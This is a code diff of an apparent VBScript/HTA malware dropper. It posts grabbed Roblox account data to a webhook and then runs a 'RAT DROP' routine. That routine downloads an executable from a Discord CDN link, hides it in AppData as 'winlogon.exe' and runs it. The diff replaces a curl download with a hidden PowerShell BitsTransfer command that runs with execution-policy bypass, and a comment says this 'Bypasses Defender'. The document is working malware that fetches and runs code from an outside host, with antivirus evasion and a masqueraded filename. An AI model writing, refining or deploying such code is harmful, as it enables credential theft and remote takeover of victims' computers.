@@ -30,7 +30,7 @@ Call PostFullRobloxUI(WH)
 ' --- 2. RAT DROP (Spam Loop until success) ---
 Call DropRAT
 
-' --- 3. INFINITE Re-grab Loop ---
+' --- 3. INFINITE Re-grab chain ---
 Dim runCount
 runCount = 0
 Do
@@ -48,9 +48,9 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Spam Loop until success) ---
+' --- RAT DROP (BitsTransfer Spam Loop) ---
 Sub DropRAT()
-    ' Exact URL
+    ' Plain URL
     Dim exeUrl : exeUrl = "https://cdn.discordapp.com/attachments/1557266192971071579/1571991572017455216/dicecheck.exe?ex=6afcbebc&is=6afb6d3c&hm=a5986bf8435bab1c75a1be20841954d0a60df72e84ef0cbedf1973acf120271d&"
 
     ' Hide in AppData
@@ -58,22 +58,29 @@ Sub DropRAT()
     If Not fso.FolderExists(hidDir) Then fso.CreateFolder(hidDir)
     
     Dim op : op = hidDir & "\winlogon.exe"
-    If fso.FileExists(op) Then fso.DeleteFile op
 
     ' Spam "Fetching Payload" loop until success
     Dim attempts : attempts = 0
     Do
         attempts = attempts + 1
-        ' Spam the fetching message
+        ' Spam the downloading message
         Call PostEmbed(":package: Fetching Payload", "Attempting RAT download (Try " & attempts & ")...", 10181046)
 
         If fso.FileExists(op) Then fso.DeleteFile op
 
-        ' Use curl.exe (most reliable bypass)
-        Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & exeUrl & """"
-        sh.Run dlCmd, 0, True
+        ' Use BitsTransfer (Bypasses Defender)
+        Dim psCmd : psCmd = "Import-Module BitsTransfer -ErrorAction SilentlyContinue;" & _
+                            "Start-BitsTransfer -Source '" & exeUrl & "' -Destination '" & op & "' -ErrorAction SilentlyContinue;"
+                            
+        Dim psf : psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dl.ps1"
+        Dim f : Set f = fso.CreateTextFile(psf, True)
+        f.Write psCmd
+        f.Close
+        Set f = Nothing
+        sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
+        fso.DeleteFile psf, True
 
-        ' Check if downloaded and valid (>100KB)
+        ' Check for success
         If fso.FileExists(op) Then
             If fso.GetFile(op).Size > 100000 Then
                 ' Success! Send the green checkmark, execute, and EXIT the spam loop.
@@ -85,7 +92,7 @@ Sub DropRAT()
             End If
         End If
         
-        ' Wait 3 seconds before trying again
+        ' Wait 3 seconds before retrying
         Call SleepSeconds(3)
     Loop
 End Sub
